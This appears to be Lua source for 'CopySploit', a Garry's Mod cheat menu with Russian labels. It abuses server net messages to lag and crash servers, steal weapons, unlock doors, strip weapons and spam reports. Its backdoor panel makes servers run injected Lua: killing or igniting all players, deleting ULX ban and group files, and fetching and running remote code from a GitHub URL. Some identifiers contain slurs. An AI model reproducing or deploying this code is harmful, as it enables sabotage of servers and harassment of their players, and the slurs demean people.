timer.Create( "CopySploit_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "CopySploit_exploit_lagsploit1" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Console Spam", {
desc = "Засоряет консоль сообщениями Seized ",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Спам", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_bigspames2" ) then
iZNX.ChatText( "Запускаем спам" )
timer.Create( "CopySploit_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u Seized by CopySploit xD " )
end
end)
else
timer.Remove( "CopySploit_exploit_bigspames2" )
iZNX.ChatText( "Прекращаем спам" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #2", {
desc = "Exploit для создания лагов на сервере",
severity = 1,
scan = function() return iZNX.ValidNetString( "Keypad" ) end,
functions = {
{ typ = "func", name = "Лаги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_lagsploit4" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "CopySploit_exploit_lagsploit4", 0, 0, function()
for i = 1, 1000 do
iZNX.NetStart("Keypad")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "CopySploit_exploit_lagsploit4" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #3", {
desc = "Сделать лаги на сервере, перемещая сервер на хост Африки",
severity = 2,
scan = function() return iZNX.ValidNetString( "CreateCase" ) end,
functions = {
{ typ = "func", name = "Лаги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_lagsploit5" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "CopySploit_exploit_lagsploit5", 0.02, 0, function()
for i = 1, 300 do
iZNX.NetStart( "CreateCase" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end)
else
timer.Remove( "CopySploit_exploit_lagsploit5" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #4", {
desc = "Exploit для создания лагов на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "rprotect_terminal_settings" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_lagsploit6" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "CopySploit_exploit_lagsploit6", 0.02, 0, function()
for i = 1, 200 do
iZNX.NetStart( "rprotect_terminal_settings" )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end
end)
else
timer.Remove( "CopySploit_exploit_lagsploit6" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #5", {
desc = "Exploit для создания лагов на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Лаги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_lagsploit7" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "CopySploit_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
iZNX.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "CopySploit_exploit_lagsploit7" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Reanimation Exploit", {
desc = "Вы автоматически воскресаете после смерти",
severity = 2,
scan = function() return iZNX.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Бессмертие", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_zombie" ) then
iZNX.ChatText( "Ты бессмертен" )
timer.Create( "CopySploit_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
iZNX.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "CopySploit_exploit_zombie" )
iZNX.ChatText( "Ты снова смертен!" )
end
end, },
},
} )
iZNX.AddExploit( "Armory Robbery", {
desc = "Возьмите оружие из арсенала полиции (вы должны быть рядом с ним) кулдаун 5 минут",
severity = 2,
scan = function() return iZNX.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Взять оружие #1", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Взять оружие #2", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Взять оружие #3", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Admin Stick | Door exploit", {
desc = "Открыть / Закрыть дверь / Удалить владельца (вы должны смотреть на дверь)",
severity = 3,
scan = function() return iZNX.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Открыть", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Закрыть", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Удалить владельца", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "CopySploit Report Spammer", {
desc = "Report спаммер",
severity = 1,
scan = function() return iZNX.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Зарепортить всех", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVER CODER BY Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "SAC Crash", {
desc = "Мгновенный краш сервера, использующего SAC анти-чит",
severity = 3,
scan = function() return iZNX.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Краш", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local tbl = {}
for i=1,400 do
tbl[i] = i
end
iZNX.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Server Crash", {
desc = "Нажмите эту кнопку, чтобы мгновенно крашнуть сервер, на 99.9% не работает",
severity = 3,
scan = function() return iZNX.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Краш", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
iZNX.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
iZNX.AddExploit( "Strip the weapons", {
desc = "Strip оружия у любого игрока.",
severity = 3,
scan = function() return iZNX.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
{ typ = "string", name = "Тип оружия", default = "*", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Стрип", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "stripclub" ) then
iZNX.ChatText( "Strip запущен" )
timer.Create( "stripclub", 0.5, 0, function()
local t = iZNX.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = iZNX.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
iZNX.ChatText( "Strip остановлен" )
end
end, },
},
} )
------------------------------------------------------------------------------------------------------------------------------------------------
function iZNX.MakeFunctionButtonr( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 0, 0, 255) ) -- Цвет текста на кнопках
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 60, 200) ) -- Цвет кнопок
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 0, 0, 80 ) ) -- Цвет верхней части кнопок
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.MakeFunctionButtonb( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) ) -- Цвет текста на кнопках
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 60, 200) ) -- Цвет кнопок
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 0, 0, 80 ) ) -- Цвет верхней части кнопок
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) ) -- Цвет текста на кнопках
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 60, 200) ) -- Цвет кнопок
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 0, 0, 80 ) ) -- Цвет верхней части кнопок
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
-------------------------------------------------------------------------
function iZNX.SoundBoard( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(110, 70, 70, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.Sound()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.Sound()
if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
iZNX.HTXCommandeSelector = vgui.Create("DFrame")
iZNX.HTXCommandeSelector:SetSize(240,350)
iZNX.HTXCommandeSelector:SetTitle("Воспроизведение Звуков")
iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.HTXCommandeSelector:MakePopup()
iZNX.HTXCommandeSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(50, 50, 90, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(0, 0, 50, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local sound1 = vgui.Create("DButton", DScrollPanel)
sound1:SetSize( 208, 20 )
sound1:SetPos( 2, 0 )
sound1:SetText("Порно звуки")
sound1:SetTextColor(Color(255, 255, 255, 255))
sound1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
sound1.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/33i6.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound2 = vgui.Create("DButton", DScrollPanel)
sound2:SetSize( 208, 20 )
sound2:SetPos( 2, 25 )
sound2:SetText("Чё пацаны, аниме? OVER9000 BASS")
sound2:SetTextColor(Color(255, 255, 255, 255))
sound2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
sound2.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/5maL.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound3 = vgui.Create("DButton", DScrollPanel)
sound3:SetSize( 208, 20 )
sound3:SetPos( 2, 50 )
sound3:SetText("Ор из Зеленого Слоника (-уши)")
sound3:SetTextColor(Color(255, 255, 255, 255))
sound3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
sound3.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/62xu.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound4 = vgui.Create("DButton", DScrollPanel)
sound4:SetSize( 208, 20 )
sound4:SetPos( 2, 75 )
sound4:SetText("Smash Mouth OVER9000 BASS (-уши)")
sound4:SetTextColor(Color(255, 255, 255, 255))
sound4.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
sound4.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/6377.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound5 = vgui.Create("DButton", DScrollPanel)
sound5:SetSize( 208, 20 )
sound5:SetPos( 2, 100 )
sound5:SetText("Gucci Gang But Im Screaming")
sound5:SetTextColor(Color(255, 255, 255, 255))
sound5.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
sound5.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/68o4.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
end
-------------------------------------------------------------------------------------
function iZNX.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(110, 70, 70, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.HTXCommandeListe()
if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
iZNX.HTXCommandeSelector = vgui.Create("DFrame")
iZNX.HTXCommandeSelector:SetSize(240,350)
iZNX.HTXCommandeSelector:SetTitle("Макросы")
iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.HTXCommandeSelector:MakePopup()
iZNX.HTXCommandeSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(50, 50, 90, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(0, 0, 50, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local commandnethtx1 = vgui.Create("DButton", DScrollPanel)
commandnethtx1:SetSize( 208, 20 )
commandnethtx1:SetPos( 2, 175 )
commandnethtx1:SetText("Убить всех")
commandnethtx1:SetTextColor(Color(255, 255, 255, 255))
commandnethtx1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx1.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Все мертвы" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
commandnethtx2:SetSize( 208, 20 )
commandnethtx2:SetPos( 2, 100 )
commandnethtx2:SetText("Хардбасс диско")
commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
commandnethtx2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx2.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Disco успешно запущено" )
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://raw.githubusercontent.com/WERooo/somelua/master/discohardbass.lua\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx3 = vgui.Create("DButton", DScrollPanel )
commandnethtx3:SetSize( 208, 20 )
commandnethtx3:SetPos( 2, 375 )
commandnethtx3:SetText("Удалить ulx баны (файл)")
commandnethtx3:SetTextColor(Color(255, 255, 255, 255))
commandnethtx3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx3.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Удалено" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx4 = vgui.Create("DButton", DScrollPanel )
commandnethtx4:SetSize( 208, 20 )
commandnethtx4:SetPos( 2, 725 )
commandnethtx4:SetText("Поджечь всех")
commandnethtx4:SetTextColor(Color(255, 255, 255, 255))
commandnethtx4.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx4.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Поджигаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx5 = vgui.Create("DButton", DScrollPanel )
commandnethtx5:SetSize( 208, 20 )
commandnethtx5:SetPos( 2, 150 )
commandnethtx5:SetText("Удалить ulx группы")
commandnethtx5:SetTextColor(Color(255, 255, 255, 255))
commandnethtx5.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx5.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Удалено" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx6 = vgui.Create("DButton", DScrollPanel )
commandnethtx6:SetSize( 208, 20 )
commandnethtx6:SetPos( 2, 50 )
commandnethtx6:SetText("Выключить сервер")
commandnethtx6:SetTextColor(Color(255, 255, 255, 255))
commandnethtx6.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx6.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Выключаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString("timer.Create( \"spamlolk\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \" \") end end)")
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx7 = vgui.Create("DButton", DScrollPanel)
commandnethtx7:SetSize( 208, 20 )
commandnethtx7:SetPos( 2, 200 )
commandnethtx7:SetText("Спам в чат")
commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
commandnethtx7.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
local chatrapemike = false
commandnethtx7.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
RainbowMike = {
"chat.AddText(Color(0,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
"chat.AddText(Color(0,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
"chat.AddText(Color(255,0,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
"chat.AddText(Color(255,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
"chat.AddText(Color(0,255,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
"chat.AddText(Color(255,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
}
        chatrapemike = !chatrapemike
        if( chatrapemike ) then
                timer.Create( "niggaspams", 0.0001, 0, function()
                    net.Start(thefrenchenculer)
                    net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([["..table.Random(RainbowMike).."]]) end " )
                    net.WriteBit (1)
                    net.SendToServer()
                end )
        else
                timer.Destroy( "niggaspams" )


        end
    end
local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
commandnethtx8:SetSize( 208, 20 )
commandnethtx8:SetPos( 2, 225 )
commandnethtx8:SetText("Изменить всем модели")
commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
commandnethtx8.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx8.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Изменяем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx9 = vgui.Create("DButton", DScrollPanel)
commandnethtx9:SetSize( 208, 20 )
commandnethtx9:SetPos( 2, 250 )
commandnethtx9:SetText("Сломать физику")
commandnethtx9:SetTextColor(Color(255, 255, 255, 255))
commandnethtx9.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx9.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
